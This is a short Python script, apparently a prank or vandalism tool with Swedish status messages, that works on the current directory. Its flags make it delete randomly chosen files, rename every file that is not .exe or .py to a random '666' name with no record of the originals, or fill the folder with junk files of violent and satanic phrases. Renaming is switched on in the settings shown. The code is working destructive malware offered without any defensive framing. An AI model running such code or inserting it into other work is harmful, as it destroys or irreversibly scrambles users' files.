````python
# Parameters
generate_junk_file = 6
random_delete = False
rename_file = True
````

````python
import random
import pathlib

def filename_generator():
    num = list(str(random.random()))[2:]
    num.append('666')
    random.shuffle(num)
    return "".join(num)

def mystic_message():
    return [
        'Violent torture ', 'Death has arrived ', 'Armageddon ',
        'Terror and fright ', 'Bleeding corpses ', 'Rotting decay ',
        'Anarchy ', 'Violent torture ', 'Antichrist ', 'Lucifer ',
        'Son of Satan ', 'Pure Fucking Armageddon ',
        'Pure Fucking Armageddon! '
    ]

def math_symbols():
    special_char = [
        '+', '-', '*', '=', '%', '%', '(', ')', '+', '=', '=', 'ω',
        '<', '>', '≥', 'S', 'V', '1', '2', '3', 'T'
    ]
    return random.choice(special_char)

def junkfile_generator():
    special_char_array = []
    for _ in range(1, 3500):
        special_char_array.append(math_symbols())
        special_char_array.append(random.choice(mystic_message()))
    random.shuffle(special_char_array)
    return special_char_array

def number_of_files():
    return random.randrange(2, 20)

def directory():
    return pathlib.Path('.').iterdir()
````

````python
# MAIN EXECUTION LOGIC

if random_delete:
    for _ in range(1, number_of_files()):
        rnd_pick = random.choice(list(directory()))
        if rnd_pick.suffix in ['.exe', '.py'] or rnd_pick.is_dir():
            pass
        else:
            print(rnd_pick, '[Raderad]')
            rnd_pick.unlink()

elif rename_file:
    for item in list(directory()):
        if item.suffix in ['.exe', '.py'] or item.is_dir():
            pass
        else:
            print(item, '[Ändrad]')
            item.rename(f"{filename_generator()}{item.suffix}")

elif generate_junk_file >= 1:
    for _ in range(generate_junk_file):
        fname = filename_generator() + '.txt'
        with open(fname, 'x', encoding='UTF-8') as f:
            for item in junkfile_generator():
                f.write(str(item))
        print(fname, '[Skapad]')
````
